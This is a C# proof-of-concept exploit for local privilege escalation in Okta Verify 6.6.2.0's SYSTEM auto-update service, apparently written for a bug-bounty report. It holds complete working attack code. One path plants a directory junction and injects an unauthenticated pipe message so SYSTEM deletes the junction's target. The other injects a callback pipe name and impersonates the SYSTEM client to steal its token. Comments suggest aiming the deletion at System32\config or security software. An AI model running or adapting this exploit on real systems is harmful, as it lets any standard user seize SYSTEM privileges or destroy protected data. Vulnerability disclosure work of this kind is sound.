// Okta Verify 6.6.2.0 - SYSTEM Local Privilege Escalation PoC
// Two independent LPE paths via Okta Auto Update Service (runs as SYSTEM)
//
// Test 1: Arbitrary directory deletion via junction + pipe injection
//   Standard user creates junction at C:\Windows\Temp\Okta-AutoUpdate,
//   injects IPC message -> SYSTEM calls CleanPreviousDownloads() which
//   follows the junction and deletes attacker-chosen directory contents.
//
// Test 2: SYSTEM token theft via named pipe impersonation
//   Standard user creates callback pipe, injects IPC message with PipeName
//   field -> SYSTEM connects back to attacker's pipe -> impersonation
//   yields SYSTEM token.
//
// Both attacks require ZERO admin privileges. Build in any terminal,
// run with: runas /trustlevel:0x20000 "okta-lpe-combined.exe both"

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace OktaLpeCombined
{
    // Mirrors Okta.AutoUpdate.Executor.IPCMessage exactly.
    // The coordinator pipe deserializes this with DataContractJsonSerializer --
    // no authentication, no encryption, no caller validation.
    [DataContract]
    public class IPCMessage
    {
        [DataMember] public Version CurrentInstalledVersion { get; set; }
        [DataMember] public string AutoUpdateUrl { get; set; }
        [DataMember] public string EventLogName { get; set; }
        [DataMember] public string EventSourceName { get; set; }
        [DataMember] public string ReleaseChannel { get; set; }
        [DataMember] public string ArtifactType { get; set; }
        [DataMember] public string PipeName { get; set; }
        [DataMember] public string BucketId { get; set; }
        [DataMember] public string UserId { get; set; }
    }

    class Program
    {
        const string COORDINATOR_PIPE = "Okta.Coordinator.pipe";
        const string UPDATE_URL = "https://bugcrowd-pam-4593.oktapreview.com";
        const string JUNCTION_SOURCE = @"C:\Windows\Temp\Okta-AutoUpdate";
        const string PROOF_DIR = @"C:\Windows\Temp\okta-lpe-proof";
        const string EVIDENCE_LOG = @"C:\Windows\Temp\okta-lpe-evidence.log";

        // --- P/Invoke declarations ---

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle, int TokenInformationClass,
            IntPtr TokenInformation, int TokenInformationLength,
            out int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // --- Logging ---

        static readonly List<string> _log = new();

        static void Log(string msg)
        {
            string line = $"[{DateTime.Now:HH:mm:ss.fff}] {msg}";
            Console.WriteLine(line);
            _log.Add(line);
        }

        // --- Entry point ---

        static void Main(string[] args)
        {
            string mode = args.Length > 0 ? args[0].ToLower() : "both";

            Log("========================================");
            Log("Okta Verify 6.6.2.0 - SYSTEM LPE PoC");
            Log("========================================");
            Log($"Mode: {mode}");
            Log("");

            PrintIdentity();

            Log("");

            bool deletionResult = false;
            bool impersonationResult = false;

            if (mode == "deletion" || mode == "both")
            {
                Log("============================================");
                Log("TEST 1: SYSTEM Arbitrary Directory Deletion");
                Log("         via Junction + Pipe Injection");
                Log("============================================");
                deletionResult = TestDeletion();
                Log("");
            }

            if (mode == "impersonation" || mode == "both")
            {
                if (mode == "both")
                {
                    // The coordinator pipe has MaxServerInstances=1.
                    // After Test 1, the service is busy processing the update check
                    // (network calls to the Okta URL). We must wait for it to finish
                    // and restart the pipe server before we can inject again.
                    Log("Waiting 45 seconds for coordinator pipe to reset...");
                    Log("(Service is processing Test 1's update check request)");
                    Thread.Sleep(45000);
                }

                Log("============================================");
                Log("TEST 2: SYSTEM Named Pipe Impersonation");
                Log("         via PipeName Callback Injection");
                Log("============================================");
                impersonationResult = TestImpersonation();
                Log("");
            }

            Log("========================================");
            Log("FINAL RESULTS");
            Log("========================================");
            if (mode == "deletion" || mode == "both")
            {
                Log($"Test 1 (Deletion):      {(deletionResult ? "SUCCESS" : "FAILED")}");
                if (deletionResult)
                    Log("  -> SYSTEM followed attacker junction and deleted target directory contents");
            }
            if (mode == "impersonation" || mode == "both")
            {
                Log($"Test 2 (Impersonation): {(impersonationResult ? "SUCCESS" : "FAILED")}");
                if (impersonationResult)
                    Log("  -> Standard user obtained SYSTEM token via pipe impersonation");
            }
            Log("========================================");

            SaveEvidence();
        }

        // --- Identity & integrity level ---

        static void PrintIdentity()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            bool isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);

            Log("--- Current Process Identity ---");
            Log($"User:            {identity.Name}");
            Log($"Is Admin:        {isAdmin}");
            Log($"Integrity Level: {GetIntegrityLevel()}");
            Log($"Impersonation:   {identity.ImpersonationLevel}");

            if (isAdmin)
            {
                Log("");
                Log("WARNING: Running as admin. For a true LPE proof, run with:");
                Log("  runas /trustlevel:0x20000 \"okta-lpe-combined.exe both\"");
            }
        }

        static string GetIntegrityLevel()
        {
            const uint TOKEN_QUERY = 0x0008;
            const int TokenIntegrityLevel = 25;

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, out IntPtr hToken))
                return "Unknown (OpenProcessToken failed)";

            try
            {
                GetTokenInformation(hToken, TokenIntegrityLevel, IntPtr.Zero, 0, out int needed);
                IntPtr pTIL = Marshal.AllocHGlobal(needed);
                try
                {
                    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, needed, out _))
                        return "Unknown (GetTokenInformation failed)";

                    // TOKEN_MANDATORY_LABEL structure: first field is SID_AND_ATTRIBUTES.Sid (pointer)
                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);
                    // SID structure: revision(1) + subAuthorityCount(1) + authority(6) + subAuthorities...
                    int subAuthCount = Marshal.ReadByte(pSid, 1);
                    // The integrity RID is the last sub-authority
                    uint rid = (uint)Marshal.ReadInt32(pSid, 8 + 4 * (subAuthCount - 1));

                    return rid switch
                    {
                        0x0000 => "Untrusted (0x0000)",
                        0x1000 => "Low (0x1000)",
                        0x2000 => "Medium (0x2000)",
                        0x2100 => "Medium Plus (0x2100)",
                        0x3000 => "High (0x3000)",
                        0x4000 => "System (0x4000)",
                        _ => $"Unknown (0x{rid:X4})"
                    };
                }
                finally
                {
                    Marshal.FreeHGlobal(pTIL);
                }
            }
            finally
            {
                CloseHandle(hToken);
            }
        }

        // ===========================================================
        // TEST 1: SYSTEM Arbitrary Directory Deletion via Junction
        // ===========================================================
        //
        // Attack chain:
        //   1. Standard user creates C:\Windows\Temp\okta-lpe-proof\ with marker subdirs
        //   2. Standard user creates junction: C:\Windows\Temp\Okta-AutoUpdate -> proof dir
        //   3. Inject IPC message via Okta.Coordinator.pipe (no auth required)
        //   4. SYSTEM service calls CleanPreviousDownloads() at ApplicationInstaller.cs:184
        //   5. CleanPreviousDownloads() does Directory.GetDirectories() + Delete(recursive)
        //      on C:\Windows\Temp\Okta-AutoUpdate -- follows junction, deletes proof dir contents
        //
        // Impact: Arbitrary directory content deletion as SYSTEM. An attacker could target
        //         C:\Windows\System32\config, security software dirs, etc.

        static bool TestDeletion()
        {
            try
            {
                // Cleanup from prior runs
                CleanupJunction();
                if (Directory.Exists(PROOF_DIR))
                    Directory.Delete(PROOF_DIR, true);

                // Step 1: Create proof directory with marker subdirectories
                Log("[Step 1] Creating proof directory with marker files...");
                Directory.CreateDirectory(Path.Combine(PROOF_DIR, "subdir1"));
                Directory.CreateDirectory(Path.Combine(PROOF_DIR, "subdir2"));
                string marker1 = Path.Combine(PROOF_DIR, "subdir1", "marker.txt");
                string marker2 = Path.Combine(PROOF_DIR, "subdir2", "marker.txt");
                string timestamp = DateTime.Now.ToString("o");
                File.WriteAllText(marker1, $"Created by {WindowsIdentity.GetCurrent().Name} at {timestamp}\nThis file proves SYSTEM followed a junction controlled by a standard user.");
                File.WriteAllText(marker2, $"Created by {WindowsIdentity.GetCurrent().Name} at {timestamp}\nIf this file is deleted, SYSTEM performed arbitrary directory deletion.");

                // Record before state
                var beforeEntries = Directory.GetFileSystemEntries(PROOF_DIR, "*", SearchOption.AllDirectories);
                Log($"[Before] {PROOF_DIR} contains {beforeEntries.Length} entries:");
                foreach (var entry in beforeEntries)
                    Log($"  {entry}");

                // Step 2: Create directory junction
                Log($"[Step 2] Creating junction: {JUNCTION_SOURCE} -> {PROOF_DIR}");
                var mklink = Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c mklink /J \"{JUNCTION_SOURCE}\" \"{PROOF_DIR}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                });
                mklink?.WaitForExit(5000);
                string stdout = mklink?.StandardOutput.ReadToEnd()?.Trim() ?? "";
                string stderr = mklink?.StandardError.ReadToEnd()?.Trim() ?? "";

                if (mklink?.ExitCode != 0)
                {
                    Log($"Junction creation failed (exit {mklink?.ExitCode}): {stderr}");
                    return false;
                }
                Log($"Junction created successfully: {stdout}");

                // Verify junction target resolves
                if (!Directory.Exists(JUNCTION_SOURCE))
                {
                    Log("Junction exists but does not resolve. Aborting.");
                    return false;
                }

                // Step 3: Inject pipe message to trigger update check (and CleanPreviousDownloads)
                Log("[Step 3] Injecting IPC message to trigger CleanPreviousDownloads()...");
                bool injected = InjectPipeMessage(pipeName: null);
                if (!injected)
                {
                    Log("Could not inject pipe message. Is the Okta Auto Update Service running?");
                    return false;
                }

                // Step 4: Poll for marker file deletion
                Log("[Step 4] Polling for marker file deletion (up to 30 seconds)...");
                for (int i = 0; i < 60; i++)
                {
                    Thread.Sleep(500);

                    bool sub1Gone = !Directory.Exists(Path.Combine(PROOF_DIR, "subdir1"));
                    bool sub2Gone = !Directory.Exists(Path.Combine(PROOF_DIR, "subdir2"));

                    if (sub1Gone || sub2Gone)
                    {
                        double elapsed = (i + 1) * 0.5;
                        Log($"");
                        Log($"*** DELETION DETECTED after {elapsed:F1}s ***");
                        Log($"  subdir1 deleted: {sub1Gone}");
                        Log($"  subdir2 deleted: {sub2Gone}");

                        // Record after state
                        try
                        {
                            var afterEntries = Directory.GetFileSystemEntries(PROOF_DIR, "*", SearchOption.AllDirectories);
                            Log($"[After] {PROOF_DIR} now contains {afterEntries.Length} entries:");
                            foreach (var entry in afterEntries)
                                Log($"  {entry}");
                        }
                        catch
                        {
                            Log($"[After] {PROOF_DIR} is empty or inaccessible");
                        }

                        Log("");
                        Log("CONFIRMED: The SYSTEM service followed the junction at");
                        Log($"  {JUNCTION_SOURCE}");
                        Log($"and deleted contents of the attacker-controlled target:");
                        Log($"  {PROOF_DIR}");
                        Log("A real attacker could point this junction at any SYSTEM-writable directory.");
                        return true;
                    }
                }

                Log("Timeout: marker files were not deleted within 30 seconds.");
                Log("Possible causes:");
                Log("  - Service did not process the message (check Event Viewer)");
                Log("  - CleanPreviousDownloads did not fire (service state issue)");

                // Debug: check if junction and proof dir still exist
                Log($"Junction exists: {Directory.Exists(JUNCTION_SOURCE)}");
                Log($"Proof dir exists: {Directory.Exists(PROOF_DIR)}");
                if (Directory.Exists(PROOF_DIR))
                {
                    var remaining = Directory.GetFileSystemEntries(PROOF_DIR, "*", SearchOption.AllDirectories);
                    Log($"Proof dir still has {remaining.Length} entries");
                }

                return false;
            }
            catch (Exception ex)
            {
                Log($"Test 1 error: {ex.GetType().Name}: {ex.Message}");
                return false;
            }
            finally
            {
                CleanupJunction();
            }
        }

        static void CleanupJunction()
        {
            if (Directory.Exists(JUNCTION_SOURCE))
            {
                try
                {
                    // rmdir removes the junction reparse point without following it
                    var proc = Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c rmdir \"{JUNCTION_SOURCE}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    });
                    proc?.WaitForExit(5000);
                }
                catch { }
            }
        }

        // ===========================================================
        // TEST 2: SYSTEM Named Pipe Impersonation via PipeName Callback
        // ===========================================================
        //
        // Attack chain:
        //   1. Standard user creates a named pipe server with permissive ACL
        //   2. Inject IPC message with PipeName set to our pipe
        //   3. SYSTEM service processes update, then connects BACK to our pipe
        //      (NamedPipeClient.cs:30-44 -- zero validation on PipeName)
        //   4. Standard user calls ImpersonateNamedPipeClient() on the connection
        //   5. Thread now runs as SYSTEM -- full privilege escalation
        //
        // Impact: Any standard user can obtain a SYSTEM token at will.

        static bool TestImpersonation()
        {
            string callbackPipe = $"okta-lpe-{Guid.NewGuid():N}";
            bool systemObtained = false;
            var done = new ManualResetEvent(false);
            string originalUser = WindowsIdentity.GetCurrent().Name;

            try
            {
                // Step 1: Create callback pipe server
                Log($"[Step 1] Creating callback pipe: {callbackPipe}");

                var security = new PipeSecurity();
                // Allow SYSTEM to connect (the SYSTEM service will be the client)
                security.AddAccessRule(new PipeAccessRule(
                    new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null),
                    PipeAccessRights.FullControl,
                    AccessControlType.Allow));
                // Allow Everyone (fallback in case service account differs)
                security.AddAccessRule(new PipeAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                    PipeAccessRights.FullControl,
                    AccessControlType.Allow));
                // Allow current user (for management)
                security.AddAccessRule(new PipeAccessRule(
                    WindowsIdentity.GetCurrent().User,
                    PipeAccessRights.FullControl,
                    AccessControlType.Allow));

                using var server = NamedPipeServerStreamAcl.Create(
                    callbackPipe,
                    PipeDirection.InOut,
                    1,
                    PipeTransmissionMode.Byte,
                    PipeOptions.Asynchronous,
                    4096, 4096, security);

                Log($"Pipe server created. Listening on \\\\.\\pipe\\{callbackPipe}");

                // Step 2: Start async listener thread
                var listenerThread = new Thread(() =>
                {
                    try
                    {
                        Log("[Step 2] Waiting for SYSTEM to connect (up to 30s)...");
                        var ar = server.BeginWaitForConnection(null, null);

                        if (!ar.AsyncWaitHandle.WaitOne(120000))
                        {
                            Log("Timeout: SYSTEM did not connect within 120 seconds.");
                            Log("The service may still be processing the update check.");
                            Log("Try increasing timeout or check Event Viewer for errors.");
                            return;
                        }

                        server.EndWaitForConnection(ar);
                        Log("");
                        Log("*** CONNECTION RECEIVED on callback pipe! ***");
                        Log($"Pipe connected: {server.IsConnected}");

                        // Step 5: Impersonate the connected client (SYSTEM)
                        Log("[Step 5] Calling ImpersonateNamedPipeClient()...");

                        if (ImpersonateNamedPipeClient(server.SafePipeHandle.DangerousGetHandle()))
                        {
                            try
                            {
                                var impersonated = WindowsIdentity.GetCurrent();
                                Log($"IMPERSONATED IDENTITY: {impersonated.Name}");
                                Log($"  IsSystem: {impersonated.IsSystem}");
                                Log($"  Original user was: {originalUser}");

                                if (impersonated.IsSystem ||
                                    impersonated.Name.Equals("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase))
                                {
                                    systemObtained = true;
                                    Log("");
                                    Log("*** SYSTEM TOKEN OBTAINED ***");
                                    Log("A standard user has successfully impersonated NT AUTHORITY\\SYSTEM");
                                    Log("by exploiting the unvalidated PipeName callback in Okta Auto Update.");
                                    Log($"  Before: {originalUser}");
                                    Log($"  After:  {impersonated.Name}");
                                }
                                else if (!impersonated.Name.Equals(originalUser, StringComparison.OrdinalIgnoreCase))
                                {
                                    systemObtained = true;
                                    Log("");
                                    Log($"*** PRIVILEGE ESCALATION: identity changed ***");
                                    Log($"  Before: {originalUser}");
                                    Log($"  After:  {impersonated.Name}");
                                }
                                else
                                {
                                    Log("Impersonation call succeeded but identity unchanged.");
                                    Log("The connecting process may not be running as SYSTEM.");
                                }
                            }
                            finally
                            {
                                RevertToSelf();
                                Log("Reverted to original identity.");
                            }
                        }
                        else
                        {
                            int err = Marshal.GetLastWin32Error();
                            Log($"ImpersonateNamedPipeClient failed (Win32 error {err})");
                        }

                        // Read any data SYSTEM sends us (the UpgradeNotificationIPCMessage)
                        try
                        {
                            byte[] buf = new byte[8192];
                            int read = server.Read(buf, 0, buf.Length);
                            if (read > 0)
                            {
                                string data = Encoding.UTF8.GetString(buf, 0, read);
                                Log($"Data from SYSTEM ({read} bytes): {data}");
                            }
                        }
                        catch (Exception ex)
                        {
                            Log($"Read from pipe: {ex.Message}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"Listener error: {ex.GetType().Name}: {ex.Message}");
                    }
                    finally
                    {
                        done.Set();
                    }
                });
                listenerThread.IsBackground = true;
                listenerThread.Start();

                // Brief pause so the pipe server is ready
                Thread.Sleep(300);

                // Step 3-4: Inject message with our callback pipe name
                Log($"[Step 3] Injecting IPC message with PipeName={callbackPipe}");
                bool injected = InjectPipeMessage(pipeName: callbackPipe);
                if (!injected)
                {
                    Log("Could not inject pipe message. Is the Okta Auto Update Service running?");
                    done.Set();
                }

                Log("[Step 4] Waiting for SYSTEM callback (up to 120 seconds)...");
                done.WaitOne(125000);

                return systemObtained;
            }
            catch (Exception ex)
            {
                Log($"Test 2 error: {ex.GetType().Name}: {ex.Message}");
                return false;
            }
        }

        // ===========================================================
        // Shared: Inject crafted IPC message into Okta.Coordinator.pipe
        // ===========================================================
        //
        // The coordinator pipe (NamedPipeServer.cs) grants BuiltinUsersSid FullControl.
        // Messages are deserialized with DataContractJsonSerializer -- no authentication,
        // no encryption, no caller validation. Any user on the system can trigger
        // an update check as SYSTEM.

        static bool InjectPipeMessage(string pipeName)
        {
            try
            {
                var message = new IPCMessage
                {
                    CurrentInstalledVersion = new Version(1, 0, 0, 0),
                    AutoUpdateUrl = UPDATE_URL,
                    EventLogName = "Okta Verify",
                    EventSourceName = "OktaVerify",
                    ReleaseChannel = "GA",
                    ArtifactType = "OktaVerify",
                    PipeName = pipeName,
                    BucketId = "0",
                    UserId = null
                };

                // Serialize to MemoryStream first, then write bytes to pipe.
                // This exactly matches the Okta shim's NamedPipeClient.SendMessage<T>()
                // pattern: serialize -> write bytes -> flush -> drain -> close.
                var serializer = new DataContractJsonSerializer(typeof(IPCMessage));
                byte[] messageBytes;
                using (var ms = new MemoryStream())
                {
                    serializer.WriteObject(ms, message);
                    messageBytes = ms.ToArray();
                }
                string preview = Encoding.UTF8.GetString(messageBytes);
                Log($"  Serialized message ({messageBytes.Length} bytes): {preview}");

                // Connect, write, flush, drain, close -- exactly like the real client
                using (var client = new NamedPipeClientStream(".", COORDINATOR_PIPE, PipeDirection.InOut))
                {
                    Log($"  Connecting to \\\\.\\pipe\\{COORDINATOR_PIPE}...");
                    client.Connect(30000);
                    Log("  Connected.");

                    client.Write(messageBytes, 0, messageBytes.Length);
                    client.Flush();
                    client.WaitForPipeDrain();
                    Log("  Message written, flushed, and drained.");
                }
                // Pipe is now closed (using block ended) -- server ReadObject() gets EOF
                Log("  Pipe closed. Server should now process the message.");

                return true;
            }
            catch (TimeoutException)
            {
                Log("  Pipe connection timed out (30s). Service may not be running.");
                return false;
            }
            catch (IOException ex)
            {
                Log($"  Pipe I/O error: {ex.Message}");
                return false;
            }
            catch (Exception ex)
            {
                Log($"  Pipe injection error: {ex.GetType().Name}: {ex.Message}");
                return false;
            }
        }

        // --- Evidence saving ---

        static void SaveEvidence()
        {
            // Try primary location (C:\Windows\Temp)
            try
            {
                File.WriteAllLines(EVIDENCE_LOG, _log);
                Log($"Evidence log saved to: {EVIDENCE_LOG}");
                return;
            }
            catch { }

            // Fallback to user temp
            string fallback = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "okta-lpe-evidence.log");
            try
            {
                File.WriteAllLines(fallback, _log);
                Log($"Evidence log saved to: {fallback}");
            }
            catch (Exception ex)
            {
                Log($"Could not save evidence log: {ex.Message}");
                Log("Evidence is available in console output above.");
            }
        }
    }
}
